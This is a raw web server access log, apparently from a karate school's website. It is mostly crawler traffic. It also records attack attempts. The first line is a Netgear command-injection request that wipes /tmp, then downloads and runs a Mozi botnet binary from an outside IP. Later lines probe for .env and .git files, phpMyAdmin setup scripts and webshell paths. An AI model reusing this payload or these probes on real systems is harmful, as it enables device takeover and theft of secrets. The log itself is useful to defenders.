::ffff:121.11.190.16 - - [30/Mar/2023:00:05:53 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://121.11.190.167:42558/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 148 "-" "-"
::ffff:167.94.138.52 - - [30/Mar/2023:14:58:45 +0000] "PRI * HTTP/2.0" - - "-" "-"
::ffff:167.94.138.52 - - [30/Mar/2023:14:58:45 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.94.138.52 - - [30/Mar/2023:14:58:45 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:54.36.148.126 - - [30/Mar/2023:15:08:22 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.11 - - [30/Mar/2023:15:08:24 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.13 - - [30/Mar/2023:15:08:26 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.12 - - [30/Mar/2023:15:08:27 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.18 - - [30/Mar/2023:15:08:28 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.4 - - [30/Mar/2023:15:08:28 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.6 - - [30/Mar/2023:15:08:29 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.4 - - [30/Mar/2023:15:08:30 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.2 - - [30/Mar/2023:15:08:31 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.20 - - [30/Mar/2023:15:08:31 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.11 - - [30/Mar/2023:15:08:32 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.9 - - [30/Mar/2023:15:08:33 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.16 - - [30/Mar/2023:15:08:34 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.13 - - [30/Mar/2023:15:08:35 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.16 - - [30/Mar/2023:15:08:35 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:154.209.125.56 - - [30/Mar/2023:15:16:58 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
::ffff:176.113.115.51 - - [30/Mar/2023:15:21:26 +0000] "GET /remote/fgt_lang HTTP/0.9" 404 154 "-" "-"
::ffff:141.95.74.78 - - [30/Mar/2023:15:37:09 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:141.95.74.78 - - [30/Mar/2023:15:37:10 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.217.54 - - [30/Mar/2023:15:38:26 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.217.54 - - [30/Mar/2023:15:38:27 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:39.103.194.15 - - [30/Mar/2023:15:42:41 +0000] "GET http://34.212.47.6:80/webadmin/scripts/setup.php HTTP/1.0" 404 165 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:42:41 +0000] "GET http://34.212.47.6:80/phpMyAdmin-2.11.4/scripts/setup.php HTTP/1.0" 404 174 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:42:41 +0000] "GET http://34.212.47.6:80/phpMyAdmin-2.5.5/scripts/setup.php HTTP/1.0" 404 173 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:42:41 +0000] "GET http://34.212.47.6:80/mysqladmin/scripts/setup.php HTTP/1.0" 404 167 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:42:41 +0000] "GET http://34.212.47.6:80/admin/scripts/setup.php HTTP/1.0" 404 162 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:42:41 +0000] "GET http://34.212.47.6:80/phpMyAdmin-2.10.3/scripts/setup.php HTTP/1.0" 404 174 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:42:41 +0000] "GET http://34.212.47.6:80/mysql/scripts/setup.php HTTP/1.0" 404 162 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:42:41 +0000] "GET http://34.212.47.6:80/mysql-admin/scripts/setup.php HTTP/1.0" 404 168 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:42:41 +0000] "GET http://34.212.47.6:80/phpMyAdmin2/scripts/setup.php HTTP/1.0" 404 168 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:42:41 +0000] "GET http://34.212.47.6:80/admin/phpmyadmin/scripts/setup.txt HTTP/1.0" 404 173 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:42:41 +0000] "GET http://34.212.47.6:80/phpMyAdmin-2.10.2/scripts/setup.php HTTP/1.0" 404 174 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:42:41 +0000] "GET http://34.212.47.6:80/phpmanager/scripts/setup.php HTTP/1.0" 404 167 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:42:41 +0000] "GET http://34.212.47.6:80/phpMyAdmin-2.8.0.2/scripts/setup.php HTTP/1.0" 404 175 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:42:41 +0000] "GET http://34.212.47.6:80/MyAdmin/scripts/setup.php HTTP/1.0" 404 164 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:42:41 +0000] "GET http://34.212.47.6:80/websql/scripts/setup.php HTTP/1.0" 404 163 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:42:41 +0000] "GET http://34.212.47.6:80/phpmy-admin/scripts/setup.php HTTP/1.0" 404 168 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:42:42 +0000] "GET http://34.212.47.6:80/web/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 171 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:42:42 +0000] "GET http://34.212.47.6:80/phpMyAdmin3/scripts/setup.php HTTP/1.0" 404 168 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:42:42 +0000] "GET http://34.212.47.6:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 167 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:42:42 +0000] "GET http://34.212.47.6:80/sqlmanager/scripts/setup.php HTTP/1.0" 404 167 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:42:42 +0000] "GET http://34.212.47.6:80/mysqlmanager/scripts/setup.php HTTP/1.0" 404 169 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:42:42 +0000] "GET http://34.212.47.6:80/db/scripts/setup.php HTTP/1.0" 404 159 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:42:42 +0000] "GET http://34.212.47.6:80/php/scripts/setup.php HTTP/1.0" 404 160 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:42:44 +0000] "GET http://34.212.47.6:80/phpMyAdmin-2/scripts/setup.php HTTP/1.0" 404 169 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:42:44 +0000] "GET http://34.212.47.6:80/phpMyAdmin-2.11.9.2/scripts/setup.php HTTP/1.0" 404 176 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:42:44 +0000] "GET http://34.212.47.6:80/admin/pma/scripts/setup.php HTTP/1.0" 404 166 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:42:48 +0000] "GET http://34.212.47.6:80/phpmyadmin/scripts/setup.php HTTP/1.0" 404 167 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:42:48 +0000] "GET http://34.212.47.6:80/phpMyAdmin-2.11.0/scripts/setup.php HTTP/1.0" 404 174 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:42:48 +0000] "GET http://34.212.47.6:80/sqlweb/scripts/setup.php HTTP/1.0" 404 163 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:42:48 +0000] "GET http://34.212.47.6:80/dbadmin/scripts/setup.php HTTP/1.0" 404 164 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:42:48 +0000] "GET http://34.212.47.6:80/phpMyAdmin-2.5.5-pl1/scripts/setup.php HTTP/1.0" 404 177 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:42:48 +0000] "GET http://34.212.47.6:80/phpMyAdmin-2.11.3/scripts/setup.php HTTP/1.0" 404 174 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:42:56 +0000] "GET http://34.212.47.6:80/php-myadmin/scripts/setup.php HTTP/1.0" 404 168 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:42:56 +0000] "GET http://34.212.47.6:80/phpMyAdmin-2.11.7/scripts/setup.php HTTP/1.0" 404 174 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:42:56 +0000] "GET http://34.212.47.6:80/myadmin/scripts/setup.php HTTP/1.0" 404 164 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:43:12 +0000] "GET http://34.212.47.6:80/pma/scripts/setup.php HTTP/1.0" 404 160 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:43:12 +0000] "GET http://34.212.47.6:80/PHPMYADMIN/scripts/setup.php HTTP/1.0" 404 167 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:43:12 +0000] "GET http://34.212.47.6:80/phpMyAdmin-2.11.1.2/scripts/setup.php HTTP/1.0" 404 176 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:43:44 +0000] "GET http://34.212.47.6:80/phpMyAdmin-2.5.4/scripts/setup.php HTTP/1.0" 404 173 "-" "-"
::ffff:39.103.194.15 - - [30/Mar/2023:15:43:44 +0000] "GET http://34.212.47.6:80/webdb/scripts/setup.php HTTP/1.0" 404 162 "-" "-"
::ffff:35.89.0.80 - - [30/Mar/2023:15:47:59 +0000] "GET /.git/HEAD HTTP/1.1" 404 148 "-" "Python-urllib/3.9"
::ffff:17.241.75.163 - - [30/Mar/2023:15:48:34 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)"
::ffff:17.241.75.163 - - [30/Mar/2023:15:48:34 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)"
::ffff:3.237.17.93 - - [30/Mar/2023:15:50:56 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3872.0 Safari/537.36 Edg/78.0.244.0"
::ffff:3.237.17.93 - - [30/Mar/2023:15:51:16 +0000] "GET /dist/js/bootstrap.bundle.min.js HTTP/1.1" 404 170 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1"
::ffff:3.237.17.93 - - [30/Mar/2023:15:51:16 +0000] "GET /ie7/ie7-standard-p.js HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Linux; Android 8.1.0; LM-X210CMR) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
::ffff:3.237.17.93 - - [30/Mar/2023:15:51:16 +0000] "GET /common.js HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Linux; Android 7.0; Lenovo K33a42) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36"
::ffff:185.191.171.24 - - [30/Mar/2023:15:51:43 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:185.191.171.25 - - [30/Mar/2023:15:51:43 +0000] "GET /contact?s=1&ss=6 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:3.237.17.93 - - [30/Mar/2023:15:51:48 +0000] "GET //code.jquery.com/jquery-3.2.1.min.js HTTP/1.1" 404 175 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3724.8 Safari/537.36"
::ffff:3.237.17.93 - - [30/Mar/2023:15:51:48 +0000] "GET //cdn.js HTTP/1.1" 404 146 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.2.1"
::ffff:3.237.17.93 - - [30/Mar/2023:15:51:48 +0000] "GET //cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js HTTP/1.1" 404 205 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/536.26.17 (KHTML like Gecko) Version/6.0.2 Safari/536.26.17"
::ffff:3.237.17.93 - - [30/Mar/2023:15:51:48 +0000] "GET /ie7/ie7-standard-p.js HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Linux; Android 8.1.0; Phone 2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
::ffff:3.237.17.93 - - [30/Mar/2023:15:51:48 +0000] "GET /common.js HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
::ffff:3.237.17.93 - - [30/Mar/2023:15:51:48 +0000] "GET //code.jquery.com/jquery-3.2.1.slim.min.js HTTP/1.1" 404 180 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
::ffff:3.237.17.93 - - [30/Mar/2023:15:51:48 +0000] "GET /dist/js/bootstrap.bundle.min.js HTTP/1.1" 404 170 "-" "Mozilla/5.0 (Linux; Android 9; INE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
::ffff:3.237.17.93 - - [30/Mar/2023:15:51:48 +0000] "GET //maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js HTTP/1.1" 404 199 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7"
::ffff:185.254.196.173 - - [30/Mar/2023:15:59:13 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.173 - - [30/Mar/2023:15:59:14 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:43.155.118.219 - - [30/Mar/2023:16:02:27 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:207.46.13.231 - - [30/Mar/2023:16:10:22 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:52.167.144.45 - - [30/Mar/2023:16:10:30 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:20.226.112.4 - - [30/Mar/2023:16:22:53 +0000] "GET /wp-includes/css/modules.php HTTP/1.1" 404 166 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:22:54 +0000] "GET /wso.php HTTP/1.1" 404 146 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:22:55 +0000] "GET /wp-content/plugins/upspy/index.php HTTP/1.1" 404 173 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:22:55 +0000] "GET /wp-content/plugins/ubh/index.php HTTP/1.1" 404 171 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:22:56 +0000] "GET /wp-content/plugins/vwcleanerplugin/bump.php?cache HTTP/1.1" 404 182 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:22:56 +0000] "GET /wp-content/plugins/xichang/x.php?xi HTTP/1.1" 404 171 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:22:57 +0000] "GET /wp-content/plugins/html404/index.html HTTP/1.1" 404 176 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:22:58 +0000] "GET /wp-admin/shapes.php HTTP/1.1" 404 158 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:22:58 +0000] "GET /olux.php HTTP/1.1" 404 147 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:22:59 +0000] "GET /indoxploit.php HTTP/1.1" 404 153 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:00 +0000] "GET / HTTP/1.1" 200 58146 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:01 +0000] "GET /up.php HTTP/1.1" 404 145 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:01 +0000] "GET /upload.php HTTP/1.1" 404 149 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:01 +0000] "GET /wp-content/uploads/ HTTP/1.1" 404 158 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:02 +0000] "GET /wp-content/uploads/2023/03/ HTTP/1.1" 404 166 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:02 +0000] "GET /shell.php HTTP/1.1" 404 148 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:03 +0000] "GET /wp-admin/network/wp-footer.php HTTP/1.1" 404 169 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:03 +0000] "GET /wp-info.php HTTP/1.1" 404 150 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:04 +0000] "GET /wp-content/vuln.php HTTP/1.1" 404 158 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:04 +0000] "GET /upel.php HTTP/1.1" 404 147 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:05 +0000] "GET /wp-content/plugins/ppus/up.php HTTP/1.1" 404 169 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:05 +0000] "GET /098.php HTTP/1.1" 404 146 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:06 +0000] "GET /V5.php HTTP/1.1" 404 145 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:06 +0000] "GET /new_license.php HTTP/1.1" 404 154 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:07 +0000] "GET /wp-content/plugins/theme-configurator/mini.php HTTP/1.1" 404 185 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:07 +0000] "GET /wp-content/plugins/widget-logic/mini.php HTTP/1.1" 404 179 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:08 +0000] "GET /wso.php HTTP/1.1" 404 146 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:08 +0000] "GET /modules/modules/modules.php HTTP/1.1" 404 166 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:09 +0000] "GET /modules/mod_simplefileuploadv1.3/elements/Clean.php HTTP/1.1" 404 190 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:09 +0000] "GET /modules/mod_simplefileuploadv1.3/elements/udd.php HTTP/1.1" 404 188 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:10 +0000] "GET /libraries/joomla/css.php HTTP/1.1" 404 163 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:11 +0000] "GET /libraries/joomla/jmails.php?u HTTP/1.1" 404 166 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:11 +0000] "GET /libraries/joomla/jmail.php?u HTTP/1.1" 404 165 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:13 +0000] "GET /images/vuln.php HTTP/1.1" 404 154 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:14 +0000] "GET /tmp/vuln.php HTTP/1.1" 404 151 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:14 +0000] "GET /XxX.php HTTP/1.1" 404 146 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:15 +0000] "GET /Marvins.php HTTP/1.1" 404 150 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:15 +0000] "GET /rxr.php?rxr HTTP/1.1" 404 146 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:16 +0000] "GET /olux.php HTTP/1.1" 404 147 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:16 +0000] "GET /indoxploit.php HTTP/1.1" 404 153 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:16 +0000] "GET /error.php HTTP/1.1" 404 148 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:17 +0000] "GET /RxR.php HTTP/1.1" 404 146 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:18 +0000] "GET /components/com_b2jcontact/izoc.php HTTP/1.1" 404 173 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:18 +0000] "GET /V3.php HTTP/1.1" 404 145 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:18 +0000] "GET /V5.php HTTP/1.1" 404 145 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:19 +0000] "GET / HTTP/1.1" 200 58146 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:21 +0000] "GET /up.php HTTP/1.1" 404 145 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:21 +0000] "GET /upload.php HTTP/1.1" 404 149 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:22 +0000] "GET /shell.php HTTP/1.1" 404 148 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:23 +0000] "GET /administrator/templates/bluestork/index.php HTTP/1.1" 404 182 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:23 +0000] "GET /administrator/templates/bluestork/error.php HTTP/1.1" 404 182 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:24 +0000] "GET /administrator/templates/hathor/index.php HTTP/1.1" 404 179 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:24 +0000] "GET /administrator/templates/hathor/error.php HTTP/1.1" 404 179 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:25 +0000] "GET /administrator/templates/isis/index.php HTTP/1.1" 404 177 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:25 +0000] "GET /administrator/templates/isis/error.php HTTP/1.1" 404 177 "-" "python-requests/2.27.1"
::ffff:20.226.112.4 - - [30/Mar/2023:16:23:27 +0000] "GET /templates/beez/index.php HTTP/1.1" 404 163 "-" "python-requests/2.27.1"
